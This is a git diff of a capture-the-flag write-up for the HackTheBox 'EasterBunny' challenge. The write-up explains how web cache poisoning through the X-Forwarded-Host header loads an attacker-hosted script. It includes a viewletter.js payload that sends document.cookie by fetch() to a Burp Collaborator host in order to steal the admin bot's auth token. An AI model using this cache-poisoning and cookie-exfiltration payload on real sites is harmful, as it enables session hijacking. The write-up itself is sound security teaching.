@@ -27,6 +27,9 @@ It's that time of the year again! Write a letter to the Easter bunny and make yo
 
 
 The EasterBunny is a easy challenge from hackthebox where you can learn a lot from it. Lets explain little bit the steps but with words, the first step is to identify web cache poisoning vulnerability and follow [web cache poisoning](https://portswigger.net/research/practical-web-cache-poisoning) methodology.
+<br>
+<br>
+Let's start where the flag is stored.. The flag is stored at the 3rd letter which if you are not an admin you can't see and you will get an error message. Our steps is to be authenticated like a admin and get the flag.
 
 ## WCP Methodology
 ![image](https://user-images.githubusercontent.com/45040001/187235119-7f8f04e9-1a0e-4899-b623-109aae0d0ceb.png)
@@ -34,69 +37,32 @@ The EasterBunny is a easy challenge from hackthebox where you can learn a lot fr
 ### Detect unkeyed input
 We can detect & inject into cache a random string just using `X-Forwarded-Host` HTTP Header. Using this header we can perform a xss attack to steal some cookies from the user in our situation from `bot.js`.<br>
 ![detect_unkeyd_input](https://user-images.githubusercontent.com/45040001/187235463-af6684d1-b75f-422d-b08f-7515db78026a.png)
+<br>
+So we can see our unkeyed input injects 3 attributes and they are:
+- /static/main.css
+- `<base href="unkeyed input:port/static" />`
+- /static/viewletter.js
+
+When you see a javascript file like the `viewletter.js` immediately you think how you can perform a xss attack right?
 
 ![unkeyd_input](https://user-images.githubusercontent.com/45040001/187235510-121c99c8-0160-463d-b4e2-c95af06b362a.png)
 
 ![viewletter_javascript](https://user-images.githubusercontent.com/45040001/187235528-15b5cbc5-faea-4430-bef9-f7891538de51.png)
 
-## Code Review
-
-### route /submit
+### Perform XSS attack 
+For exploitation part first of all we need a HTTP server(free solution ngrok) and create a directory tree like that:
+![folder_tree](https://user-images.githubusercontent.com/45040001/187313837-93762db5-ebfc-4c99-9f69-132ce594b72c.png)
+<br>
+And the most important our malicious `viewletter.js` hosted in our http server where with this script we can steal the auth token and get the flag.
 ```javascript
-router.post("/submit", async (req, res) => {
-    const { message } = req.body;
-
-    if (message) {
-        return db.insertMessage(message)
-            .then(async inserted => {
-                try {
-                    botVisiting = true;
-                    await visit(`http://127.0.0.1/letters?id=${inserted.lastID}`, authSecret);
-                    botVisiting = false;
-                }
-                catch (e) {
-                    console.log(e);
-                    botVisiting = false;
-                }
-                res.status(201).send(response(inserted.lastID));
-            })
-            .catch(() => {
-                res.status(500).send(response('Something went wrong!'));
-            });
-    }
-    return res.status(401).send(response('Missing required parameters!'));
-});
+//viewletter.js
+fetch('http://4w1j76r5ydqthsa2yt357tr45vbmzb.burpcollaborator.net/', {
+		    method: 'POST',
+		    body: document.cookie
+		    });
 ```
-
-### bot.js
-```javascript
-const visit = async(url, authSecret) => {
-    try {
-        const browser = await puppeteer.launch(browser_options);
-        let context = await browser.createIncognitoBrowserContext();
-        let page = await context.newPage();
-
-        await page.setCookie({
-            name: 'auth',
-            value: authSecret,
-            domain: '127.0.0.1',
-        });
-
-        await page.goto(url, {
-            waitUntil: 'networkidle2',
-            timeout: 5000,
-        });
-        await page.waitForTimeout(3000);
-        await browser.close();
-    } catch (e) {
-        console.log(e);
-    }
-};
-```
-
-
-
-### authorisation.js
+The challenge source code has a file called `authorisation.js` where somebody can see how `admin`  authorization works.<br>
+So if someone wants to be authenticated like a admin he must be from localhost and he must know the `authSecret` which is a random value.
 ```javascript
 const authSecret = require('crypto').randomBytes(69).toString('hex');
 
@@ -109,15 +75,28 @@ module.exports = {
   isAdmin,
 };
 ```
-
-
-
-### viewletter.js (steal cookies)
+So far so good.. But how will get the `authSecret` from admin? we should steal the cookies from him(or from `bot.js`)
 ```javascript
-fetch('http://4w1j76r5ydqthsa2yt357tr45vbmzb.burpcollaborator.net/', {
-		    method: 'POST',
-		    body: document.cookie
-		    });
+//part from bot.js
+await page.setCookie({
+            name: 'auth',
+            value: authSecret,
+            domain: '127.0.0.1',
+        });
 ```
+
+Now lets take a look how the bot visiting works. At source code of `routes.js` in the `/submit` route we can see the bot visit the last inserted letter but with a little bit different host, pay attention at `127.0.0.1`
+```javascript
+//part of routes.js
+botVisiting = true;
+await visit(`http://127.0.0.1/letters?id=${inserted.lastID}`, authSecret);
+botVisiting = false;
+```
+
+
+
+
+
+
 
 [ip bypass headers](https://gist.githubusercontent.com/kaimi-/6b3c99538dce9e3d29ad647b325007c1/raw/339dad3040fd1a967588edf341eb72b033a9d9fe/gistfile1.txt)
